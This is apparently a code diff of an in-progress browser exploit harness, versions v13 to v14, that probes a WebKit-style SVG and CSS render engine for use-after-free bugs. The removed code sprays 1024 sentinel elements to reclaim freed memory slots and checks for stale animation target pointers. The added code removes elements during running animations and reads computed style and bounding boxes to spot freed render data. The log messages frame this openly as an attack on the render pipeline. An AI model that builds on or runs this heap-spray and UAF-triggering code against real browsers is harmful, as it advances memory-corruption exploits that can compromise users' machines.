-        const tagFreqLocal={};
-
-        for(let t=0;t<8;t++){
-            const{useEl,anim,sym1,sym2,cached}=await setup(`at_${typeName}_${t}`);
-            if(!cached){await teardown();continue;}
-
-            // Remove useEl first to stop it grabbing slot
-            useEl.remove();
-            sym1.remove();
-
-            // Spray with this element type
-            const ss=getSpraySvg();
-            for(let i=0;i<SPRAY_COUNT;i++){
-                const el=mkEl();
-                el.setAttribute('id',`SENTINEL_${typeName}_${t}_${i}`);
-                ss.appendChild(el);
+        // Tight loop: getComputedStyle immediately and repeatedly
+        const LOOP=200;
+        const opValues=[];
+        for(let i=0;i<LOOP;i++){
+            try{
+                const cs=getComputedStyle(sym1);
+                const op=cs.opacity;
+                opValues.push(op);
+            }catch(ex){
+                crashCount++;
+                opValues.push('[crash:'+ex.message+']');
+                break;
             }
-
-            livesvg.appendChild(useEl);
-            await raf();
-
-            let postTgt=null,postTag='?',postId='?';
-            try{postTgt=anim.targetElement;}catch(e){crashCount++;await teardown();continue;}
-            if(!postTgt){await teardown();continue;}
-            try{postTag=postTgt.tagName;}catch(e){postTag='[crash]';}
-            try{postId=postTgt.id;}catch(e){postId='[crash]';}
-
-            tagFreqLocal[postTag]=(tagFreqLocal[postTag]||0)+1;
-            if(postId.includes('SENTINEL')){hitCount++;}
-
-            await teardown();
         }
 
-        results[typeName]={hitCount,tagFreqLocal,crashCount};
-        const tagStr=Object.entries(tagFreqLocal).map(([k,v])=>`${k}×${v}`).join(' ');
-        log(`  ${typeName.padEnd(8)}: hit=${hitCount} crash=${crashCount} tags=[${tagStr}]`,hitCount>0?'bad':'dim');
+        // Analyze: any value between 0 and 1 exclusive (mid-animation)?
+        const unique=[...new Set(opValues)];
+        const midAnim=unique.some(v=>{const f=parseFloat(v);return!isNaN(f)&&f>0&&f<1;});
+        const allZero=unique.every(v=>v==='0'||v==='0.01'||v==='');
+        const hasCrash=unique.some(v=>v.includes('crash'));
+
+        if(midAnim&&!allZero){
+            hitCount++;
+            hitValues.push({t,base:baseOp,unique:unique.slice(0,5)});
+            log(`  t${t}: [STALE ANIM VALUES] base=${baseOp} unique=${unique.slice(0,4).join('|')}`,'bad');
+        }else if(hasCrash){
+            crashCount++;
+            log(`  t${t}: CRASH in getComputedStyle loop`,'bad');
+        }else{
+            missCount++;
+            if(t<3)log(`  t${t}: base=${baseOp} unique=${unique.slice(0,3).join('|')}`,'dim');
+        }
+
+        clearStyle();
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
     }
 
-    log('\n[*] AT: any hit>0 type = matches sym1 bmalloc size class','inf');
-    const hits=Object.entries(results).filter(([,r])=>r.hitCount>0);
-    if(hits.length>0){
-        log('[+] SIZE CLASS MATCH FOUND:','bad');
-        for(const[t,r]of hits)log(`  ${t}: hit=${r.hitCount}`,'bad');
-    }else{
-        log('[*] no type matched — sym1 size class may be unique or spray timing off','inf');
+    log(`\n[*] GC: hit=${hitCount} miss=${missCount} crash=${crashCount}`,(hitCount>0||crashCount>0?'bad':'inf'));
+    if(hitCount>0){
+        log(`[+] getComputedStyle returned mid-animation values after remove() — style UAF!`,'bad');
+        for(const h of hitValues)log(`    t${h.t}: ${h.base}→${h.unique.join('|')}`,'bad');
     }
 
     if(!q)dis(false);
-    return results;
+    return{hitCount,missCount,crashCount};
 }
 
-// ── WR: write-then-read — CSS animation + SMIL freeze ─────────────────────
-// Try CSS animation (different internal path than SMIL animate)
-// CSS animations also cache references to their target elements
-// SMIL animate with fill="freeze": animation stays at end value after duration
-// these might have different ptr lifetimes or different nulling behavior
-// Also: test animateTransform and animateMotion (different SVG animate types)
-async function runWR(q=false){
-    if(!q){dis(true);sep();log('▶ WR: write-then-read — CSS anim + freeze + animateTransform variants','inf');sep();}
-    log('[*] testing different animate types for targetElement UAF behavior','inf');
-    log('[*] CSS animation, animateTransform, animateMotion, fill=freeze','ok');
+// ── FO: foreignObject boundary UAF ───────────────────────────────────────
+// Put sym1 inside <foreignObject> inside SVG
+// foreignObject creates HTML/SVG layout boundary — unusual for symbols
+// CSS animation on foreignObject while sym1 is inside
+// Also: <use> referencing sym1 from outside foreignObject (cross-boundary use)
+// remove sym1 while foreignObject animation is running
+// Check: does cross-boundary use crash? does getBBox on foreignObject return stale data?
+async function runFO(q=false){
+    if(!q){dis(true);sep();log('▶ FO: foreignObject boundary — sym1 inside fo, use outside','inf');sep();}
+    log('[*] sym1 inside foreignObject → use references sym1 from outside fo','inf');
+    log('[*] CSS anim on foreignObject → remove sym1 mid-animation','ok');
+    log('[*] also: getBBox(foreignObject) after sym1 remove → stale layout data?','ok');
     log('');
 
-    // Test 1: CSS animation (via CSS @keyframes, not SMIL)
-    // CSS animations don't have a JS targetElement property directly
-    // but they fire animationstart/animationend events on the element
-    // check if element reference in event handler survives after remove()
-    log('[*] T1: CSS animation event reference persistence after remove()','inf');
-    {
-        const el=document.createElementNS(SVG_NS,'symbol');
-        el.setAttribute('id','css_target');
-        el.setAttribute('viewBox','0 0 100 100');
-        livesvg.appendChild(el);
+    let staleCount=0,crashCount=0,normalCount=0;
 
-        let capturedTarget=null;
-        el.addEventListener('animationstart',e=>{
-            capturedTarget=e.target;
-        },{once:true});
+    injectStyle(`
+        @keyframes fo_pulse {
+            0%{opacity:1}50%{opacity:0.5}100%{opacity:1}
+        }
+        .fo_anim { animation: fo_pulse 0.05s linear infinite; }
+    `);
 
-        const style=document.createElement('style');
-        style.textContent=`@keyframes test{0%{opacity:1}100%{opacity:0}}#css_target{animation:test 0.1s infinite;}`;
-        document.head.appendChild(style);
+    for(let t=0;t<16;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();await raf();
+
+        // sym1 inside foreignObject
+        const fo=document.createElementNS(SVG_NS,'foreignObject');
+        fo.setAttribute('width','100');fo.setAttribute('height','100');
+        fo.setAttribute('x','0');fo.setAttribute('y','0');
+        fo.setAttribute('class','fo_anim');
+
+        const innerSvg=document.createElementNS(SVG_NS,'svg');
+        innerSvg.setAttribute('width','100');innerSvg.setAttribute('height','100');
+        const sym1=mkSym(`fo_${t}`,80,80);
+        innerSvg.appendChild(sym1);
+        fo.appendChild(innerSvg);
+
+        // useEl in OUTER SVG referencing sym1 inside foreignObject
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#fo_${t}`);
+
+        livesvg.appendChild(fo);
+        livesvg.appendChild(useEl);
 
         await raf();await raf();
-        el.remove();
-        style.remove();
 
-        if(capturedTarget){
-            try{
-                const tag=capturedTarget.tagName;
-                const id=capturedTarget.id;
-                log(`  CSS event ref after remove: tagName=${tag} id=${id}`,'hi');
-            }catch(e){
-                log(`  CSS event ref crash after remove: ${e.message}`,'bad');
-            }
+        // Baseline getBBox
+        let baseW=0,baseFoW=0;
+        try{baseW=useEl.getBBox().width;}catch(e){}
+        try{baseFoW=fo.getBBox().width;}catch(e){}
+
+        // Remove sym1 from inside foreignObject while CSS anim is running on fo
+        sym1.remove();
+
+        // Read getBBox immediately
+        let p1W=null,p1Crash=null;
+        try{p1W=useEl.getBBox().width;}catch(ex){p1Crash=String(ex);crashCount++;}
+
+        let p2W=null,p2Crash=null;
+        try{p2W=fo.getBBox().width;}catch(ex){p2Crash=String(ex);crashCount++;}
+
+        // getComputedStyle on sym1 (inside fo, removed)
+        let p3Op=null,p3Crash=null;
+        try{p3Op=getComputedStyle(sym1).opacity;}catch(ex){p3Crash=String(ex);crashCount++;}
+
+        // getBBox on sym1 itself (removed from inside fo)
+        let p4W=null,p4Crash=null;
+        try{const bb=sym1.getBBox();p4W=bb.width;}catch(ex){p4Crash=String(ex);crashCount++;}
+
+        const interesting=(p1Crash||p2Crash||p4Crash)||(p4W!==null&&p4W!==0&&p4W!==baseFoW);
+        if(interesting){
+            staleCount++;
+            log(`  t${t}: [INTERESTING] base_use=${baseW} base_fo=${baseFoW}`,'bad');
+            log(`         p1_use=${p1W??p1Crash} p2_fo=${p2W??p2Crash} p3_op=${p3Op??p3Crash} p4_sym=${p4W??p4Crash}`,'bad');
         }else{
-            log(`  CSS: no animationstart fired within 2 rAFs`,'dim');
+            normalCount++;
+            if(t<3)log(`  t${t}: base_use=${baseW} p1=${p1W} p2_fo=${p2W} p3=${p3Op} p4_sym=${p4W}`,'dim');
         }
+
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
     }
 
-    // Test 2: animateTransform — different from animate (href vs transform)
-    log('\n[*] T2: animateTransform.targetElement UAF','inf');
-    {
-        let hit=0,miss=0,raw=0;
-        const tagFreq={};
-        for(let t=0;t<16;t++){
-            while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-            clearSpray();
-            await raf();await raf();
-
-            const sym1=mkSym1(`wt_${t}`);
-            livesvg.appendChild(sym1);
-
-            const anim=document.createElementNS(SVG_NS,'animateTransform');
-            anim.setAttribute('attributeName','transform');
-            anim.setAttribute('attributeType','XML');
-            anim.setAttribute('type','rotate');
-            anim.setAttribute('values','0;360');
-            anim.setAttribute('dur','0.1s');
-            anim.setAttribute('repeatCount','indefinite');
-            sym1.appendChild(anim);
-
-            await raf();await raf();
-
-            let preTgt=null;
-            try{preTgt=anim.targetElement;}catch(e){}
-            if(!preTgt){await teardown();continue;}
-
-            const SPRAY_COUNT=1024;
-            sym1.remove();
-            const ss=getSpraySvg();
-            for(let i=0;i<SPRAY_COUNT;i++){
-                const sp=document.createElementNS(SVG_NS,'symbol');
-                sp.setAttribute('id',`SENTINEL_wt_${t}_${i}`);
-                const r=document.createElementNS(SVG_NS,'rect');
-                r.setAttribute('width','999');
-                sp.appendChild(r);
-                ss.appendChild(sp);
-            }
-            await raf();
-
-            let postTgt=null,postTag='?',postId='?';
-            try{postTgt=anim.targetElement;}catch(e){}
-            if(!postTgt){miss++;await teardown();continue;}
-            try{postTag=postTgt.tagName;}catch(e){}
-            try{postId=postTgt.id;}catch(e){}
-
-            tagFreq[postTag]=(tagFreq[postTag]||0)+1;
-            if(postId&&postId.includes('SENTINEL')){
-                hit++;
-                log(`  t${t}: [HIT animateTransform!] id=${postId}`,'bad');
-            }else{
-                if(t<3)log(`  t${t}: post tgt=${postTag} id=${postId}`,'dim');
-            }
-
-            await teardown();
-        }
-        const tagStr=Object.entries(tagFreq).map(([k,v])=>`${k}×${v}`).join(' ');
-        log(`  animateTransform: hit=${hit} miss=${miss} tags=[${tagStr}]`,hit>0?'bad':'dim');
-    }
-
-    // Test 3: animate with fill="freeze" — ptr kept alive longer?
-    log('\n[*] T3: animate fill=freeze — ptr lifetime different?','inf');
-    {
-        let hit=0,miss=0;
-        const tagFreq={};
-        for(let t=0;t<12;t++){
-            while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-            clearSpray();
-            await raf();await raf();
-
-            const sym1=mkSym1(`wf_${t}_s1`);
-            const sym2=mkSym2(`wf_${t}_s2`);
-            livesvg.appendChild(sym1);livesvg.appendChild(sym2);
-
-            const useEl=document.createElementNS(SVG_NS,'use');
-            useEl.setAttribute('href',`#wf_${t}_s1`);
-            const anim=document.createElementNS(SVG_NS,'animate');
-            anim.setAttribute('attributeName','href');
-            anim.setAttribute('values',`#wf_${t}_s1;#wf_${t}_s2`);
-            anim.setAttribute('dur','0.2s');
-            anim.setAttribute('fill','freeze'); // frozen at end value
-            // no repeatCount — runs once and freezes
-            useEl.appendChild(anim);
-            livesvg.appendChild(useEl);
-
-            // Wait for animation to complete and freeze
-            await raf();await raf();await raf();await raf();
-
-            let preTgt=null;
-            try{preTgt=anim.targetElement;}catch(e){}
-
-            // Now remove sym1 — animation is frozen at sym2
-            useEl.remove();
-            sym1.remove();
-
-            // Spray
-            const ss=getSpraySvg();
-            for(let i=0;i<1024;i++){
-                const sp=document.createElementNS(SVG_NS,'symbol');
-                sp.setAttribute('id',`SENTINEL_wf_${t}_${i}`);
-                const r=document.createElementNS(SVG_NS,'rect');r.setAttribute('width','999');
-                sp.appendChild(r);ss.appendChild(sp);
-            }
-            livesvg.appendChild(useEl);
-            await raf();
-
-            let postTgt=null,postTag='?',postId='?';
-            try{postTgt=anim.targetElement;}catch(e){}
-            if(!postTgt){miss++;await teardown();continue;}
-            try{postTag=postTgt.tagName;}catch(e){}
-            try{postId=postTgt.id;}catch(e){}
-
-            tagFreq[postTag]=(tagFreq[postTag]||0)+1;
-            if(postId&&postId.includes('SENTINEL')){
-                hit++;
-                log(`  t${t}: [HIT fill=freeze!] id=${postId}`,'bad');
-            }else if(t<3){
-                log(`  t${t}: tgt=${postTag} id=${postId}`,'dim');
-            }
-
-            await teardown();
-        }
-        const tagStr=Object.entries(tagFreq).map(([k,v])=>`${k}×${v}`).join(' ');
-        log(`  fill=freeze: hit=${hit} miss=${miss} tags=[${tagStr}]`,hit>0?'bad':'dim');
-    }
+    clearStyle();
+    log(`\n[*] FO: stale=${staleCount} normal=${normalCount} crash=${crashCount}`,(staleCount>0||crashCount>0?'bad':'inf'));
+    if(staleCount>0)log(`[+] foreignObject boundary exposes stale render data!`,'bad');
 
     if(!q)dis(false);
+    return{staleCount,normalCount,crashCount};
 }
 
-// ── RUN ALL ───────────────────────────────────────────────────────────────
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG animate UAF v13 — immediate read + standalone + alt spray','inf');sep();
-    log('[*] v12: ST miss=32 raw=0 — slot zeroed before read (bmalloc fast zero)','ok');
-    log('[*] v12: 80.0 was live useEl geometry, not freed sym1 memory','ok');
-    log('[*] v13: find which approach lets JS spray WIN the slot race','ok');log('');
+    log('▶ SVG CSS render UAF v14 — CSS anim + layout mid-remove + computed style + fo','inf');sep();
+    log('[*] v13 PIVOT: SMIL targetElement always returns useEl (JSC sanitized)','ok');
+    log('[*] v14: attack CSS render pipeline (not sanitized by JSC bridge)','ok');
+    log('[*] crash = confirms UAF in render path | stale values = freed memory read','ok');log('');
     const R={};
     for(const[lbl,fn]of[
-        ['IR_immediate_read',runIR],
-        ['SA_standalone_anim',runSA],
-        ['AT_alt_spray_types',runAT],
-        ['WR_write_then_read',runWR],
+        ['CS_css_render',runCS],
+        ['LY_layout_remove',runLY],
+        ['GC_computed_style',runGC],
+        ['FO_foreignObject',runFO],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
         try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
         log('');
     }
-    sep();log('▶ SUMMARY v13','inf');sep();
-    log('[*] IR: if live>0 — stale ptr IS read before slot reused (timing window exists)','inf');
-    log('[*] SA: standalone anim removes useEl contention — best spray chance','inf');
-    log('[*] AT: which element type matches sym1 size class → spray with that type','inf');
-    log('[*] WR: animateTransform / fill=freeze might have longer-lived stale ptr','inf');
+    sep();log('▶ SUMMARY v14','inf');sep();
+    log('[*] CS: stale computed style inside animation event = C++ render UAF','inf');
+    log('[*] LY: getBBox(sym1_after_remove)!=0 = freed RenderObject accessed','inf');
+    log('[*] GC: mid-anim opacity in getComputedStyle loop = style engine UAF','inf');
+    log('[*] FO: crash in getBBox inside foreignObject = cross-boundary render UAF','inf');
     for(const[lbl,r]of Object.entries(R)){
-        if(r)log(`  ${lbl}: ${JSON.stringify(r).slice(0,120)}`,'dim');
+        if(r){
+            const hit=r.staleCount||r.hitCount||r.eventsFired||0;
+            const crash=r.crashCount||0;
+            log(`  ${lbl}: ${JSON.stringify(r)}`,(crash>0||hit>0?'bad':'dim'));
+        }
     }
     sep();dis(false);
 }
